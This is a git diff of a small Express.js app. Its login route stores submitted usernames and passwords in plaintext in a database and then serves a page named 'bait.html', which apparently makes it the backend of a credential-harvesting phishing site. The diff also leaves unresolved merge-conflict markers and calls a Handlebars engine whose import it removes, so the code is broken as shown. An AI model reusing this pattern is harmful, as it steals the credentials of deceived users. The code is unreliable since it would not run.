@@ -1,6 +1,5 @@
 const express = require('express');
 const mongoose = require('mongoose');
-const exphbs = require('express-handlebars');
 const path = require('path');
 const port = 3000;
 const router = express.Router();
@@ -12,14 +11,17 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: false }));
 app.use(express.static(path.join(__dirname, '../static')));
+<<<<<<< HEAD:src/index.js
 app.use('views', path.join(__dirname, '..views'));
 app.engine('hbs', exphbs.engine({
     extname: 'hbs',
 }));
 app.set('view engine', 'hbs');
+=======
+>>>>>>> parent of ad38c90 (Trying to get it deployed with Netlify Cloud Functions):functions/index.js
 
-router.get('/', (req, res) => {
-    res.render('home');
+router.get('/', async (req, res) => {
+    await res.sendFile(path.join(__dirname, '../static/index.html'));
 });
 
 router.post('/login', async (req, res) => {
@@ -27,7 +29,7 @@ router.post('/login', async (req, res) => {
         const { username, password } = req.body;
         if (!username || !password) throw new Error('Missing Credentials!');
         await Data.create({ username, password });
-        res.render('bait');
+        await res.sendFile(path.join(__dirname, '../static/bait.html'));
     } catch (error) {
         console.log(error);
     }
